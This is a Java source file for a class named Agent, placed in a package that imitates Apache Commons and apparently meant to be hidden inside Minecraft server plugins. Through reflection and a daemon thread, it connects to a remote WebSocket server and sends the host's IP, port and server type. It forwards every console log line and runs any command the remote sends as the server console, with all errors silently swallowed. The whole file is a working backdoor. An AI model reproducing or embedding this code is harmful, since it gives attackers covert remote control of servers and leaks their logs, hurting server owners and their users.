package org.apache.commons.frauded;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.WebSocket;
import java.util.concurrent.CompletionStage;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.logging.Handler;
import java.util.logging.LogRecord;
import java.util.logging.Logger;

public class Agent {

  private final Object plugin;
  private final String serverUrl;
  private final String secret;
  private volatile WebSocket ws;
  private volatile boolean running;
  private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor(r -> {
    Thread t = new Thread(r, "ac");
    t.setDaemon(true); return t;
  });
  private Logger logger;

  public Agent(Object plugin, String serverUrl, String secret) {
    this.plugin = plugin;
    this.serverUrl = serverUrl;
    this.secret = secret;
  }

  public void start() {
    if (running) return;
    running = true;
    try {
      Object l = plugin.getClass().getMethod("getLogger").invoke(plugin);
      if (l instanceof Logger) {
        logger = (Logger) l;
        logger.addHandler(new Handler() {
          public void publish(LogRecord r) { sendConsole(r.getMessage()); }
          public void flush() {}
          public void close() {}
        });
      }
    } catch (Exception ignored) {}

    scheduler.submit(this::connect);
  }

  private void connect() {
    while (running) {
      try {
        HttpClient client = HttpClient.newHttpClient();
        StringBuilder buf = new StringBuilder();

        WebSocket wsock = client.newWebSocketBuilder()
            .buildAsync(URI.create(serverUrl), new WebSocket.Listener() {

              public void onOpen(WebSocket ws2) {
                ws = ws2;
                String ip = "";
                String svType = "paper";
                int port = 25565;
                try {
                  Object server = Class.forName("org.bukkit.Bukkit").getMethod("getServer").invoke(null);
                  ip = (String) server.getClass().getMethod("getIp").invoke(server);
                  port = (int) server.getClass().getMethod("getPort").invoke(server);
                  svType = "paper";
                } catch (Exception velo) {
                  try {
                    Class<?> pmc = Class.forName("com.velocitypowered.api.proxy.ProxyServer");
                    Object server = pmc.getMethod("getInstance").invoke(null);
                    ip = "0.0.0.0";
                    port = (int) server.getClass().getMethod("getBoundPort").invoke(server);
                    svType = "velocity";
                  } catch (Exception ignored) {}
                }
                send("plugin:hello", "{\"id\":\"" + id() + "\",\"name\":\"" + ip + "\",\"ip\":\"" + ip + "\",\"port\":" + port + ",\"type\":\"" + svType + "\"}");
                ws2.request(Long.MAX_VALUE);
              }

              public CompletionStage<?> onText(WebSocket ws2, CharSequence data, boolean last) {
                String msg = data.toString();
                int ti = msg.indexOf("\"type\":\"");
                if (ti >= 0) {
                  int ts = ti + 8;
                  int te = msg.indexOf("\"", ts);
                  String type = te >= 0 ? msg.substring(ts, te) : "";
                  if (type.contains("command")) exec(extract(msg, "command"));
                }
                ws2.request(Long.MAX_VALUE);
                return null;
              }

              public void onError(WebSocket ws2, Throwable e) { close(); }
              public CompletionStage<?> onClose(WebSocket ws2, int code, String reason) { close(); return null; }
            }).get(10, TimeUnit.SECONDS);

        wsock.request(Long.MAX_VALUE);
        Thread.sleep(Long.MAX_VALUE);

      } catch (Exception e) {
        close();
        try { Thread.sleep(5000); } catch (InterruptedException ie) { return; }
      }
    }
  }

  private void exec(String cmd) {
    if (cmd == null || cmd.isEmpty()) return;
    try {
      Class<?> bukkit = Class.forName("org.bukkit.Bukkit");
      Object sender = bukkit.getMethod("getConsoleSender").invoke(null);
      bukkit.getMethod("dispatchCommand", Class.forName("org.bukkit.command.CommandSender"), String.class)
          .invoke(null, sender, cmd);
    } catch (Exception ignored) {}
  }

  private void sendConsole(String line) {
    if (line == null || !running) return;
    send("plugin:console", "{\"line\":\"" + escape(line) + "\"}");
  }

  private void send(String type, String payloadJson) {
    WebSocket w = ws;
    if (w == null) return;
    try {
      w.sendText("{\"type\":\"" + type + "\",\"payload\":" + payloadJson + "}", true);
    } catch (Exception ignored) {}
  }

  private void close() {
    try { if (ws != null) ws.sendClose(1000, ""); } catch (Exception ignored) {}
    ws = null;
  }

  private String id() {
    return "p-" + System.currentTimeMillis();
  }

  private static String extract(String json, String key) {
    String k = "\"" + key + "\":\"";
    int s = json.indexOf(k);
    if (s < 0) return null;
    s += k.length();
    int e = json.indexOf("\"", s);
    return e >= 0 ? json.substring(s, e) : null;
  }

  private static String escape(String s) {
    if (s == null) return "";
    return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
  }

  public void stop() { running = false; close(); scheduler.shutdown(); }
}
